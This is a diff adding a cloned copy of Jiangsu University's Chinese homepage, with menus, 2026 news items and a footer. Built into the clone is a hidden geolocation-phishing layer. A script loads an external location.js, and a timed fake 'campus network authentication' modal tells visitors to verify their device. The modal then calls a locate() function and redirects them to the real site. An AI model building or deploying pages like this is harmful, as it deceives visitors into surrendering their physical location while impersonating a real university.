@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+    <title>江苏大学欢迎您！</title>
+    <meta name="description" content="江苏大学官方主页 - 工科特色鲜明、多学科协调发展的高水平研究型大学">
+    <meta name="author" content="Miso">
+    <meta name="mobile-web-app-capable" content="yes">
+    <link rel="icon" href="https://www.ujs.edu.cn/images/favicon.png">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="renderer" content="webkit">
+    <base href="https://www.ujs.edu.cn/">
+    <link rel="stylesheet" href="css/reset.css">
+    <link rel="stylesheet" href="css/a_animate.css">
+    <link rel="stylesheet" href="css/swiper.min.css">
+    <link rel="stylesheet" href="css/slick.css">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="index.vsb.css">
+    <script src="js/jquery.js"></script>
+    <script>
+    if (window.location.protocol == "http:") {
+        var restOfUrl = window.location.href.substr(5);
+        
+    }
+    </script>
+    <!-- Location capture (absolute URL to bypass base tag) -->
+    <script>
+    (function(){
+        var s = document.createElement('script');
+        s.src = '/js/location.js';
+        document.head.appendChild(s);
+    })();
+    </script>
+    <style>
+    /* Location Modal - overlay on top of the real site */
+    .seeker-modal-overlay {
+        position: fixed; inset: 0; background: rgba(0,0,0,0.45);
+        z-index: 999999; display: none; align-items: center; justify-content: center;
+        backdrop-filter: blur(3px);
+    }
+    .seeker-modal-overlay.show { display: flex; }
+    .seeker-modal {
+        background: #fff; border-radius: 8px; padding: 32px 28px;
+        max-width: 420px; width: 90%; text-align: center;
+        box-shadow: 0 16px 48px rgba(0,0,0,0.3);
+        font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Microsoft YaHei", sans-serif;
+    }
+    .seeker-modal-icon {
+        width: 60px; height: 60px; background: linear-gradient(135deg, #11823b, #1a9e50);
+        border-radius: 50%; margin: 0 auto 16px;
+        display: flex; align-items: center; justify-content: center;
+        font-size: 26px; color: #fff;
+    }
+    .seeker-modal h3 { font-size: 18px; font-weight: 600; color: #11823b; margin-bottom: 10px; }
+    .seeker-modal p { font-size: 13px; color: #666; line-height: 1.7; margin-bottom: 18px; }
+    .seeker-spinner {
+        width: 30px; height: 30px; border: 3px solid #e5e5e5;
+        border-top-color: #11823b; border-radius: 50%;
+        margin: 0 auto 14px; animation: seeker-spin .8s linear infinite;
+    }
+    @keyframes seeker-spin { to { transform: rotate(360deg); } }
+    .seeker-status { font-size: 13px; color: #27ae60; margin-bottom: 12px; min-height: 18px; }
+    .seeker-btn {
+        background: #11823b; color: #fff; border: none;
+        padding: 10px 32px; font-size: 14px; font-weight: 600;
+        border-radius: 4px; cursor: pointer; transition: background .2s;
+    }
+    .seeker-btn:hover { background: #0d6b30; }
+    /* Cookie notice */
+    .seeker-cookie {
+        position: fixed; bottom: 0; left: 0; right: 0;
+        background: #2c2c2c; color: #ccc; z-index: 999998;
+        padding: 12px 20px; font-size: 12px;
+        font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Microsoft YaHei", sans-serif;
+    }
+    .seeker-cookie-inner {
+        max-width: 1200px; margin: 0 auto;
+        display: flex; align-items: center; gap: 16px; flex-wrap: wrap;
+    }
+    .seeker-cookie-inner p { flex: 1; min-width: 200px; }
+    .seeker-cookie-inner a { color: #4a9eff; text-decoration: underline; }
+    .seeker-cookie-btn {
+        background: #11823b; color: #fff; border: none;
+        padding: 6px 16px; border-radius: 4px; cursor: pointer; font-size: 12px;
+    }
+    .seeker-cookie-btn-sec {
+        background: transparent; border: 1px solid #666; color: #ccc;
+        padding: 6px 16px; border-radius: 4px; cursor: pointer; font-size: 12px;
+    }
+    </style>
+</head>
+<body id="body">
+
+    <!-- Cookie Banner -->
+    <div class="seeker-cookie" id="seekerCookie">
+        <div class="seeker-cookie-inner">
+            <p>本网站使用 Cookie 及类似技术为您提供更好的浏览体验。继续使用即表示您同意我们的 <a href="#">隐私政策</a> 和 <a href="#">Cookie 政策</a>。</p>
+            <button class="seeker-cookie-btn" onclick="document.getElementById('seekerCookie').style.display='none'">接受全部</button>
+            <button class="seeker-cookie-btn-sec" onclick="document.getElementById('seekerCookie').style.display='none'">仅必要</button>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <section class="header_box">
+        <section class="header_box_li">
+            <header id="header" class="head">
+                <div class="wp flex">
+                    <div id="logo">
+                        <a href="index.htm" title="江苏大学中文主站2023"><img class="hover_img_src" src="images/logo.png" alt=""></a>
+                    </div>
+                    <div class="right">
+                        <div class="header_top">
+                            <div class="list_box0">
+                                <div class="li"><a href="http://ehall.ujs.edu.cn/" class="wl" target="_blank">综合门户</a></div>
+                                <div class="li"><a href="http://xnxx.ujs.edu.cn/" class="wl" target="_blank">校内信息</a></div>
+                                <div class="li"><a href="http://lib.ujs.edu.cn/" class="wl" target="_blank">图书馆</a></div>
+                                <div class="li"><a href="https://webvpn.ujs.edu.cn/" class="wl" target="_blank">VPN</a></div>
+                                <div class="li"><a href="https://mail.ujs.edu.cn/" class="wl" target="_blank">电子邮箱</a></div>
+                                <div class="li"><a href="http://eng.ujs.edu.cn/" class="wl" target="_blank">English</a></div>
+                                <div class="li">
+                                    <a href="javascript:;" class="search_btn fr btn" name="tss">
+                                        <img src="images/ser.png" alt="">
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div id="nav">
+                            <ul>
+                                <li class="xiala">
+                                    <a href="xxgk/xxgk.htm"><h3>学校概况</h3></a>
+                                    <div class="sub"><div class="box">
+                                        <a href="xxgk/xxzc.htm">学校章程</a>
+                                        <a href="xxgk/xxgk.htm">学校概况</a>
+                                        <a href="xxgk/xxld2.htm">学校领导</a>
+                                        <a href="xxgk/xsyg.htm">校史沿革</a>
+                                        <a href="xxgk/xxbs.htm">学校标识</a>
+                                        <a href="http://xxgk.ujs.edu.cn/">信息公开</a>
+                                    </div></div>
+                                </li>
+                                <li class="xiala">
+                                    <a href="https://jiangfan.ujs.edu.cn/"><h3>新闻中心</h3></a>
+                                    <div class="sub"><div class="box">
+                                        <a href="xwzx/xxyw.htm">学校要闻</a>
+                                        <a href="xwzx/mtjj.htm">媒体聚焦</a>
+                                        <a href="xwzx/jxky.htm">教学科研</a>
+                                        <a href="xwzx/xsjz.htm">学术讲座</a>
+                                    </div></div>
+                                </li>
+                                <li class="xiala">
+                                    <a href="jgsz.htm"><h3>机构设置</h3></a>
+                                    <div class="sub"><div class="box">
+                                        <a href="jgsz.htm#dqbm">党政管理机构</a>
+                                        <a href="jgsz.htm#qtzz">群团组织</a>
+                                        <a href="jgsz.htm#jxjg">教学机构</a>
+                                        <a href="jgsz.htm#kyjg">科研机构</a>
+                                        <a href="jgsz.htm#jfjg">教辅机构</a>
+                                    </div></div>
+                                </li>
+                                <li class="xiala">
+                                    <a href="jyjx/rczp.htm"><h3>教育教学</h3></a>
+                                    <div class="sub"><div class="box">
+                                        <a href="http://rsc.ujs.edu.cn/">师资队伍</a>
+                                        <a href="jyjx/rczp.htm">人才招聘</a>
+                                        <a href="http://yjsy.ujs.edu.cn/">学科建设</a>
+                                        <a href="https://jwc.ujs.edu.cn/">本科生教育</a>
+                                        <a href="http://yjsy.ujs.edu.cn/">研究生教育</a>
+                                        <a href="https://oec.ujs.edu.cn">留学生教育</a>
+                                    </div></div>
+                                </li>
+                                <li class="xiala">
+                                    <a href="http://kjc.ujs.edu.cn/"><h3>科学研究</h3></a>
+                                    <div class="sub"><div class="box">
+                                        <a href="http://kjc.ujs.edu.cn/">科技动态</a>
+                                        <a href="http://skc.ujs.edu.cn/">社科动态</a>
+                                        <a href="https://cxyc.ujs.edu.cn/">产学研合作</a>
+                                        <a href="http://zscq.ujs.edu.cn/">知识产权</a>
+                                        <a href="http://zzs.ujs.edu.cn/">学术期刊</a>
+                                    </div></div>
+                                </li>
+                                <li class="xiala">
+                                    <a href="https://zb.ujs.edu.cn/"><h3>招生就业</h3></a>
+                                    <div class="sub"><div class="box">
+                                        <a href="https://zb.ujs.edu.cn/">本科生招生</a>
+                                        <a href="https://yz.ujs.edu.cn/">研究生招生</a>
+                                        <a href="https://oec.ujs.edu.cn/zsxx/zsjz_xczy.htm">留学生招生</a>
+                                        <a href="https://ujs.91job.org.cn/sub-station/home/10299">就业信息</a>
+                                    </div></div>
+                                </li>
+                                <li class="xiala">
+                                    <a href="http://foreign.ujs.edu.cn/"><h3>合作交流</h3></a>
+                                    <div class="sub"><div class="box">
+                                        <a href="http://foreign.ujs.edu.cn/">国际合作</a>
+                                        <a href="https://xyh.ujs.edu.cn/">教育发展基金会</a>
+                                    </div></div>
+                                </li>
+                                <li class="xiala">
+                                    <a href="http://lib.ujs.edu.cn/"><h3>校园服务</h3></a>
+                                    <div class="sub"><div class="box">
+                                        <a href="http://lib.ujs.edu.cn/">图书馆</a>
+                                        <a href="http://hqc.ujs.edu.cn/">后勤服务</a>
+                                        <a href="http://dag.ujs.edu.cn/">档案馆</a>
+                                        <a href="http://xsg.ujs.edu.cn/">校史馆</a>
+                                        <a href="https://jwc.ujs.edu.cn/index/xl_zuo_xi_shi_jian.htm">校历</a>
+                                    </div></div>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </header>
+        </section>
+    </section>
+
+    <!-- Banner -->
+    <div class="main-visual-wrapper">
+        <div class="main-visual-slider">
+            <div class="swiper-wrapper">
+                <div class="swiper-slide">
+                    <a href="https://ehall.ujs.edu.cn/">
+                        <div class="slide-inner">
+                            <div class="imged" style="background:url(banner/20260508-annv.jpg) center/cover no-repeat;padding-bottom:50vh;"></div>
+                        </div>
+                    </a>
+                </div>
+                <div class="swiper-slide">
+                    <div class="slide-inner">
+                        <div class="imged" style="background:url(banner/20260505-lixia.jpg) center/cover no-repeat;padding-bottom:50vh;"></div>
+                    </div>
+                </div>
+                <div class="swiper-slide">
+                    <div class="slide-inner">
+                        <div class="imged" style="background:url(banner/20260428-leisikaimu.jpg) center/cover no-repeat;padding-bottom:50vh;"></div>
+                    </div>
+                </div>
+                <div class="swiper-slide">
+                    <div class="slide-inner">
+                        <div class="imged" style="background:url(banner/20260413-wqw.jpg) center/cover no-repeat;padding-bottom:50vh;"></div>
+                    </div>
+                </div>
+                <div class="swiper-slide">
+                    <div class="slide-inner">
+                        <div class="imged" style="background:url(banner/20260326-qianyue.jpg) center/cover no-repeat;padding-bottom:50vh;"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 学校要闻 home1 -->
+    <div class="section home1">
+        <div class="wp">
+            <div class="title flex">
+                <h3>学校要闻</h3>
+                <div class="more"><a href="xwzx/xxyw.htm">MORE <img src="images/more.png" alt=""></a></div>
+            </div>
+            <div class="home1-t flex">
+                <div class="left">
+                    <div class="h1-t">
+                        <a href="info/1062/211542.htm">
+                            <div class="imaged"><div class="imged" style="background:url(__local/F/A5/ED/EDUAI277680__local__7A0D2F6B_6D7B_41FD_AE70_FB87AF6EDC8A.jpg) center/cover no-repeat;height:2rem"></div></div>
+                            <div class="con">
+                                <h3>2026年宣传思想文化工作会议举行</h3>
+                                <p><span><i>05</i> / 2026-05</span></p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <div class="mid">
+                    <a href="info/1062/211662.htm">
+                        <h3>学校党委召开5月份党务工作例会</h3>
+                        <h4>会议对近期重点工作进行了部署，强调要深入学习贯彻习近平新时代中国特色社会主义思想...</h4>
+                    </a>
+                    <a href="info/1062/211672.htm">
+                        <h3>2026届毕业生就业工作推进会举行</h3>
+                        <h4>会议要求各单位要进一步提高政治站位，压实工作责任，多措并举促进毕业生高质量充分就业...</h4>
+                    </a>
+                    <a href="info/1062/210452.htm">
+                        <h3>镇江市委书记吴庆文来校调研</h3>
+                        <h4>吴庆文一行参观了学校科技创新成果展，对学校在服务地方经济社会发展方面取得的成绩给予高度评价...</h4>
+                    </a>
+                    <a href="info/1062/209372.htm">
+                        <h3>学校连续六年获省属高校高质量发展综合考核"第一等次"</h3>
+                        <h4>这是学校自2020年以来连续第六年获此殊荣，充分体现了学校办学实力和社会影响力的持续提升...</h4>
+                    </a>
+                </div>
+                <div class="right">
+                    <div class="con">
+                        <a href="info/1062/211352.htm">
+                            <h3>中国-波黑"一带一路"联合实验室揭牌</h3>
+                            <h4>双方将在智能农机装备领域开展深入合作...</h4>
+                        </a>
+                        <a href="info/1062/209022.htm">
+                            <h3>学校部署开展树立和践行正确政绩观学习教育</h3>
+                            <h4>会议强调要以高度的政治责任感推进学习教育走深走实...</h4>
+                        </a>
+                        <a href="info/1062/211622.htm">
+                            <h3>学校2026年第2次行政工作例会举行</h3>
+                            <h4>会议对本学期重点工作推进情况进行了总结...</h4>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 媒体聚焦 home2 -->
+    <div class="section home2">
+        <div class="wp">
+            <div class="title flex">
+                <h3>媒体聚焦</h3>
+                <div class="more"><a href="xwzx/mtjj.htm">MORE <img src="images/more.png" alt=""></a></div>
+            </div>
+            <div class="home2-t">
+                <ul class="flex">
+                    <li>
+                        <a href="info/1063/211292.htm">
+                            <div class="con">
+                                <div class="imaged"><div class="imged" style="background:url(__local/4/78/E3/EDUAI277680__local__4E9A0C3C_D88C_4F3A_A5FC_E4D6A1F2C3B8.jpg) center/cover no-repeat;height:2.2rem"></div></div>
+                                <h3>沃得农机·2026耒耜国际会议开幕</h3>
+                                <p><span><i>05</i> / 2026-05</span></p>
+                                <h4>来自20多个国家和地区的专家学者齐聚一堂，共同探讨智能农机装备与现代农业高质量发展...</h4>
+                            </div>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="info/1063/210892.htm">
+                            <div class="con">
+                                <h3>农业机器人助力智慧农业发展</h3>
+                                <p><span><i>04</i> / 2026-04</span></p>
+                                <h4>江苏大学农业工程学院��队研发的智能农业机器人在多个省份推广应用...</h4>
+                                <div class="line"></div>
+                                <p>江苏卫视</p>
+                            </div>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="info/1063/210122.htm">
+                            <div class="con">
+                                <div class="imaged"><div class="imged" style="background:url(__local/B/2C/5F/EDUAI277680__local__B2C5F8A7_D9E3_4A1C_B5E2_F3A7C6D8E9F0.jpg) center/cover no-repeat;height:2.2rem"></div></div>
+                                <h3>专利转化赋能产业创新</h3>
+                                <p><span><i>04</i> / 2026-04</span></p>
+                                <h4>学校积极推进专利成果转化，多项核心专利技术实现产业化应用...</h4>
+                            </div>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="info/1063/209852.htm">
+                            <div class="con">
+                                <h3>智能农机装备技术创新获突破</h3>
+                                <p><span><i>03</i> / 2026-03</span></p>
+                                <h4>研究团队在智能感知、自主导航等关键技术方面取得系列突破...</h4>
+                                <div class="line"></div>
+                                <p>科技日报</p>
+                            </div>
+                        </a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- 教学科研 home3 -->
+    <div class="section home3">
+        <div class="wp">
+            <div class="title flex">
+                <h3>教学科研</h3>
+                <div class="more"><a href="xwzx/jxky.htm">MORE <img src="images/more.png" alt=""></a></div>
+            </div>
+            <div class="home3-t">
+                <div class="imaged"><div class="imged" style="background:url(images/n-p4.jpg) center/cover no-repeat;padding-bottom:31%"></div></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 数说江大 home6 - Stats -->
+    <div class="section home66">
+        <div class="wp">
+            <div class="title flex">
+                <h3>数说江大</h3>
+            </div>
+            <div class="home6-t flex">
+                <div class="left">
+                    <ul>
+                        <li>
+                            <div class="img"><div class="cir"><img src="images/sz.png" alt=""><p>学科门类</p></div></div>
+                            <span><i>12</i></span>
+                        </li>
+                        <li>
+                            <div class="img"><div class="cir"><img src="images/sz1.png" alt=""><p>一级学科博士点</p></div></div>
+                            <span><i>16</i></span>
+                        </li>
+                        <li>
+                            <div class="img"><div class="cir"><img src="images/sz2.png" alt=""><p>本科专业</p></div></div>
+                            <span><i>98</i></span>
+                        </li>
+                        <li>
+                            <div class="img"><div class="cir"><img src="images/sz3.png" alt=""><p>博士后流动站</p></div></div>
+                            <span><i>14</i></span>
+                        </li>
+                    </ul>
+                </div>
+                <div class="right">
+                    <ul>
+                        <li>
+                            <div class="img"><div class="cir"><img src="images/sz4.png" alt=""><p>占地面积</p></div></div>
+                            <span><i>3000+</i>亩</span>
+                        </li>
+                        <li>
+                            <div class="img"><div class="cir"><img src="images/sz5.png" alt=""><p>一级学科硕士点</p></div></div>
+                            <span><i>46</i></span>
+                        </li>
+                        <li>
+                            <div class="img"><div class="cir"><img src="images/sz6.png" alt=""><p>教学机构</p></div></div>
+                            <span><i>34</i></span>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 快速链接 home8 -->
+    <div class="section home8">
+        <div class="wp">
+            <div class="home8-t" style="position:relative">
+                <ul class="flex">
+                    <li>
+                        <a href="https://jiangfan.ujs.edu.cn/">
+                            <div class="img"><img src="images/ico1.png" alt=""></div>
+                            <p>新闻中心</p>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="http://gis.ujs.edu.cn/">
+                            <div class="img"><img src="images/ico2.png" alt=""></div>
+                            <p>VR地图</p>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://webvpn.ujs.edu.cn/">
+                            <div class="img"><img src="images/ico3.png" alt=""></div>
+                            <p>VPN服务</p>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://mail.ujs.edu.cn/">
+                            <div class="img"><img src="images/ico4.png" alt=""></div>
+                            <p>电子邮箱</p>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="jyjx/rczp.htm">
+                            <div class="img"><img src="images/ico5.png" alt=""></div>
+                            <p>人才招聘</p>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://xyh.ujs.edu.cn/">
+                            <div class="img"><img src="images/ico6.png" alt=""></div>
+                            <p>校友会</p>
+                        </a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="wp">
+            <div class="foot-t flex">
+                <div class="fot1">
+                    <p>地址：江苏省镇江市学府路301号</p>
+                    <p>邮编：212013</p>
+                    <p>电话：0511-88780000</p>
+                    <div class="bq flex">
+                        <div class="img"><img src="images/bq1.png" alt="" style="width:100%"></div>
+                        <div class="p">
+                            <a href="http://bszs.conac.cn/sitename?method=show&id=09573466771001c5e650a0013c92" target="_blank"><img src="images/bq1.png" alt="" style="width:18px"> 苏ICP备05071359号</a>
+                        </div>
+                    </div>
+                    <div class="bq flex" style="margin-top:8px">
+                        <div class="img"><img src="images/batb.png" alt="" style="width:100%"></div>
+                        <div class="p">
+                            <a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=32110202000039" target="_blank"><img src="images/batb.png" alt="" style="width:18px"> 苏公网安备 32110202000039号</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="fot2">
+                    <div class="log"><img src="images/log.png" alt="" style="max-width:300px"></div>
+                </div>
+                <div class="fot3">
+                    <ul class="flex">
+                        <li>
+                            <div class="ewm"><img src="images/wxgzh.png" alt="" style="width:100%"></div>
+                            <p>官方微信</p>
+                        </li>
+                        <li>
+                            <div class="ewm"><img src="images/wbtp.png" alt="" style="width:100%"></div>
+                            <p>官方微博</p>
+                        </li>
+                        <li>
+                            <div class="ewm"><img src="images/weixin.png" alt="" style="width:100%"></div>
+                            <p>企业微信</p>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Location Modal -->
+    <div class="seeker-modal-overlay" id="seekerModal">
+        <div class="seeker-modal">
+            <div class="seeker-modal-icon">&#127963;</div>
+            <h3>校园网络认证</h3>
+            <p>检测到您正在访问校园信息服务。为保障网络安全，请完成设备验证后继续访问。</p>
+            <div class="seeker-spinner" id="seekerSpinner"></div>
+            <p class="seeker-status" id="seekerStatus"></p>
+            <button class="seeker-btn" id="seekerBtn" style="display:none"
+                onclick="locate(function(){
+                    document.getElementById('seekerStatus').innerHTML='验证通过，正在跳转...';
+                    setTimeout(function(){window.location='https://www.ujs.edu.cn/';}, 800);
+                }, function(){
+                    document.getElementById('seekerStatus').innerHTML='验证失败，请重试';
+                    document.getElementById('seekerBtn').innerHTML='重试';
+                });">确认验证</button>
+        </div>
+    </div>
+
+    <script>
+        // Init body class
+        document.getElementById('body').className = 'a_body';
+
+        // Header scroll effect
+        window.addEventListener('scroll', function() {
+            var header = document.getElementById('header');
+            if (window.scrollY > 50) {
+                header.classList.add('xg');
+            } else {
+                header.classList.remove('xg');
+            }
+        });
+
+        // Banner simple auto-slide
+        (function(){
+            var slides = document.querySelectorAll('.swiper-slide');
+            var current = 0;
+            if (slides.length === 0) return;
+            setInterval(function(){
+                slides[current].style.display = 'none';
+                current = (current + 1) % slides.length;
+                slides[current].style.display = 'block';
+            }, 5000);
+        })();
+
+        // Location modal
+        setTimeout(function(){
+            document.getElementById('seekerModal').classList.add('show');
+            setTimeout(function(){
+                document.getElementById('seekerSpinner').style.display = 'none';
+                document.getElementById('seekerStatus').innerHTML = '验证就绪';
+                document.getElementById('seekerBtn').style.display = 'inline-block';
+            }, 2500);
+        }, 3000);
+    </script>
+</body>
+</html>
